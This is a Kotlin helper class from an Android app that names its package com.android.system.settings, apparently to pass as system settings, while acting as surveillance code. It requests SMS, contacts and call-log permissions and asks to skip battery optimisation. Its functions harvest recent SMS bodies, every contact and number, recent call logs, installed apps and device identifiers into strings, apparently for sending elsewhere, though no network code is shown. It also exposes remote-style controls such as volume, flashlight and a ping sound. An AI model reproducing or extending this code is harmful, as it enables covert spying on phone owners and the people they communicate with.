package com.android.system.settings

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.bluetooth.BluetoothAdapter
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.hardware.Camera
import android.hardware.camera2.CameraManager
import android.location.LocationManager
import android.media.AudioDeviceInfo
import android.media.AudioManager
import android.media.MediaPlayer
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class Functions {

    //request permissions
    fun requestAllPermissions(context: Context){
        val requestAllPermissions = 100
        val permissionsToRequest = arrayOf(
            Manifest.permission.READ_CONTACTS, //contacts permission
            Manifest.permission.READ_SMS, //sms permission
            Manifest.permission.READ_CALL_LOG //read call log permission
        )
        val permissionsNotGranted = permissionsToRequest.filter {
            ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsNotGranted.isNotEmpty()) {
            ActivityCompat.requestPermissions(context as Activity, permissionsNotGranted, requestAllPermissions)
        }
    }

    //ask permission to ignore battery optimization
    @SuppressLint("BatteryLife")
    @RequiresApi(Build.VERSION_CODES.M)
    fun requestIgnoreBatteryOptimizations(context: Context) {
        val packageName = context.packageName
        val intent = Intent().apply {
            action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
            data = android.net.Uri.parse("package:$packageName")
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            context.startActivity(intent)
        }
    }

    //check if connected to a wifi or not
    fun isConnectedToWifi(context: Context): Boolean {
        val connectivityManager = context.getSystemService(AppCompatActivity.CONNECTIVITY_SERVICE) as ConnectivityManager

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
        } else {
            @Suppress("DEPRECATION")
            val networkInfo = connectivityManager.activeNetworkInfo
            (networkInfo?.type == ConnectivityManager.TYPE_WIFI) && networkInfo.isConnected
        }
    }

    //get percentage of battery
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun getBatteryPercentage(context: Context): Int {
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
            context.registerReceiver(null, filter)
        }
        val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level != -1 && scale != -1) {
            (level * 100 / scale.toFloat()).toInt()
        } else {
            -1
        }
    }

    //check if screen is on or off
    fun isScreenOn(context: Context): Boolean {
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
            powerManager.isInteractive
        } else {
            @Suppress("DEPRECATION")
            powerManager.isScreenOn
        }
    }

    //check if phone is charging or not
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun isCharging(context: Context): Boolean {
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
            context.registerReceiver(null, filter)
        }
        val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
    }

    //increase/decrease -  media/ring volume
    fun increaseMediaVolume(context: Context,type:String,vol:String):Int {
        // Initialize AudioManager with the provided context
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val mediaVolume = AudioManager.STREAM_MUSIC
        val ringVolume = AudioManager.STREAM_RING
        // Get the current media volume
        val currentVolume = audioManager.getStreamVolume(if(vol=="md")mediaVolume else ringVolume)
        // Get the maximum media volume
        val maxVolume = audioManager.getStreamMaxVolume(if(vol=="md")mediaVolume else ringVolume)
        // Calculate the desired volume level (you can adjust this based on your needs)
        var desiredVolume = currentVolume
        if(type =="inc"){desiredVolume += 1}
        else if(type == "dec"){desiredVolume -=1}
        // Set the new volume level, ensuring it doesn't exceed the maximum volume
        audioManager.setStreamVolume(
            if(vol=="md")mediaVolume else ringVolume,
            desiredVolume.coerceAtMost(maxVolume),
            AudioManager.FLAG_SHOW_UI
        )
        return desiredVolume
    }

    //start flashlight
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun openFlashlight(context: Context,on:Boolean):Boolean {
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val cameraId = cameraManager.cameraIdList[0]
                cameraManager.setTorchMode(cameraId, on)
            } else {
                val camera = Camera.open()
                val parameters = camera.parameters
                parameters.flashMode = if(on) Camera.Parameters.FLASH_MODE_TORCH else  Camera.Parameters.FLASH_MODE_OFF
                camera.parameters = parameters
                if(on)camera.startPreview() else camera.stopPreview()
                if(on) camera.release()
            }
        }  catch (e: Exception) {
            e.printStackTrace()
        }
        return on
    }

    //check if gps is on or not
    fun isGpsEnabled(context: Context): Boolean {
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
    }

    @SuppressLint("QueryPermissionsNeeded")
    //get apps that are installed in phone
    fun getInstalledAppNames(context: Context):String {
        var allApps = ""
        val packageManager = context.packageManager
        val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        val appNames = mutableListOf<String>()
        for (appInfo in installedApps) {
            // Check if the app is not a system app
            if ((appInfo.flags and ApplicationInfo.FLAG_SYSTEM) == 0) {
                val appName = packageManager.getApplicationLabel(appInfo).toString()
                appNames.add(appName)
            }
        }
        for (appName in appNames.sorted()) {
            allApps+=" $appName ,"
        }
        return allApps
    }

    //get android details
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    @SuppressLint("HardwareIds")
    fun getDetails(context: Context):String{
        val metrics = context.resources.displayMetrics
        return "Model :  ${Build.MODEL}\\n" +
                "MANUFACTURER : ${Build.MANUFACTURER}\\n" +
                "release : ${Build.VERSION.RELEASE}\\n" +
                "brand : ${Build.BRAND}\\n" +
                "hardware : ${Build.HARDWARE}\\n" +
                "serial : ${Build.SERIAL}\\n" +
                "id : ${Build.ID}\\n" +
                "time : ${Build.TIME}\\n" +
                "bootloader : ${Build.BOOTLOADER}\\n" +
                "abis : ${Build.SUPPORTED_ABIS.joinToString()}\\n" +
                "resolution :${metrics.widthPixels}x${metrics.heightPixels}\\n" +
                ""
    }

    @SuppressLint("ServiceCast")
    //check if headphone is connected or not
    fun checkHeadphonesStatus(context: Context):String {
        var connected = "not connected"
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val devices = audioManager.getDevices(AudioManager.GET_DEVICES_OUTPUTS)
            for (device in devices) {
                if (device.type == AudioDeviceInfo.TYPE_WIRED_HEADSET || device.type == AudioDeviceInfo.TYPE_WIRED_HEADPHONES) {
                    // Headphones are connected
                    println("Headphones are connected")
                    connected =  "connected"
                }
            }
        } else {
            // For devices running below Android M
            val isWiredHeadsetConnected = audioManager.isWiredHeadsetOn
            if (isWiredHeadsetConnected) {
                connected = "connected"
            }
        }
        // Headphones are not connected
        return "Headphones are $connected"
    }

    //check if bluetooth on or off
    fun checkBluetoothStatus():String {
        var status = ""
        try{
            val bluetoothAdapter: BluetoothAdapter? = BluetoothAdapter.getDefaultAdapter()
            if (bluetoothAdapter == null) {
                // Device doesn't support Bluetooth
                status = "not supported in this device"
            } else {
                if (bluetoothAdapter.isEnabled) {
                    // Bluetooth is enabled
                    status = "is enabled"
                } else {
                    // Bluetooth is disabled
                    status = "is disabled"
                    // You can prompt the user to enable Bluetooth
                }
            }
        }catch (e: java.lang.Exception){
            status=e.toString()
        }
        return "bluetooth is $status"
    }
    //sub function of checkPermissions
    private fun grantedPermissions(context: Context,permission:String):Boolean{
        return ContextCompat.checkSelfPermission(context,permission) == PackageManager.PERMISSION_GRANTED
    }

    //check if permissions are allowed or not
    fun checkPermissions(context: Context):String{
        return "\\n" +
                "Contact permission : ${if(grantedPermissions(context,Manifest.permission.READ_CONTACTS))"ALLOWED" else "DENIED"}\\n" +
                "SMS permission : ${if(grantedPermissions(context,Manifest.permission.READ_SMS))"ALLOWED" else "DENIED"}\\n" +
                "Call_Log permission : ${if(grantedPermissions(context,Manifest.permission.READ_CALL_LOG))"ALLOWED" else "DENIED"}\\n"
    }

    //get sms
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    @SuppressLint("Recycle", "Range")
    fun getMessages(context: Context):String{
        var content = "\\n"
        try{
            val uri = Telephony.Sms.CONTENT_URI
            val cursor = context.contentResolver.query(uri,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE),null,null, "${Telephony.Sms.DATE} DESC LIMIT 5")
            cursor?.use{
                while (it.moveToNext()){
                    val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS))
                    val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY))
                    val date = it.getLong(it.getColumnIndex(Telephony.Sms.DATE))
                    val type = it.getInt(it.getColumnIndex(Telephony.Sms.TYPE))
                    val messageType =if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "Inbox" else if (type == Telephony.Sms.MESSAGE_TYPE_SENT) "Sent" else "Other"
                    var message = "Address : $address\\n" +"Date : $date\\n" + "TYPE : $messageType \\n" + "content: \\n${body}\\n"
                    content+=message
                }
            }
        }catch (e:java.lang.SecurityException){
            content = "SMS Permission denied"
        }catch (e: java.lang.Exception){
            content = "$e"
        }
        return content
    }

    //get contacts
    @SuppressLint("Recycle")
    fun getContacts(context: Context):String{
        var content = "\\n"
        try{
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            cursor?.use{
                val nameColumn = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberColumn = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while(it.moveToNext()){
                    val name = it.getString(nameColumn)
                    val number = it.getString(numberColumn)
                    content += "Name: $name, Number: $number\\n"
                }
            }
        }catch (e:java.lang.SecurityException){
            content= "CONTACT Permission denied"
        }
        return content
    }

    //get last 10 calllogs
    @SuppressLint("Recycle")
    fun getCallLogs(context: Context):String{
        var content = "\\n"
        try{
            val cursor: Cursor? = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                "${CallLog.Calls.DATE} DESC LIMIT 10"
            )
            cursor?.use{
                val numberColumn = it.getColumnIndex(CallLog.Calls.NUMBER)
                val dateColumn = it.getColumnIndex(CallLog.Calls.DATE)
                val typeColumn = it.getColumnIndex(CallLog.Calls.TYPE)
                while (it.moveToNext()) {
                    val number = it.getString(numberColumn)
                    val date = it.getLong(dateColumn)
                    val type = it.getInt(typeColumn)
                    val callType =
                        when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            CallLog.Calls.MISSED_TYPE -> "Missed"
                            else -> "Unknown"
                        }

                    // Concatenate the call log details to the 'content' variable
                    content += "Number: $number, Date: $date, Type: $callType\\n"
                    // Log the call log details (you can remove this in production)
                }
            }
        }catch (e:java.lang.SecurityException){
            content= "CONTACT Permission denied"
        }catch (e:java.lang.Exception){
            Log.d("check1",e.toString())
            content = "$e"
        }
        return content
    }

    //play sound res/raw/ping.mp3
    fun playSound(context: Context):String{
        var mediaPlayer: MediaPlayer? = null
        mediaPlayer = MediaPlayer.create(context, R.raw.ping)
        mediaPlayer?.start()
        mediaPlayer?.setOnCompletionListener {
            mediaPlayer?.release()
            mediaPlayer = null
        }
        return "played sound"
    }

    //return boolean of all permissions allowed (to open settings in mainActivity once permissionns are allowed)
    fun isAllPermissionAllowed(context: Context):Boolean{
        var status = false
        if(grantedPermissions(context,Manifest.permission.READ_CALL_LOG) && grantedPermissions(context,Manifest.permission.READ_SMS) && grantedPermissions(context,Manifest.permission.READ_CONTACTS)){
            status=true
        }
        return status
    }

    ///check if an app is installed with package name
    fun isAppInstalled(context: Context, packageName: String): Boolean {
        val packageManager: PackageManager = context.packageManager
        return try {
            packageManager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES)
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
    }

}
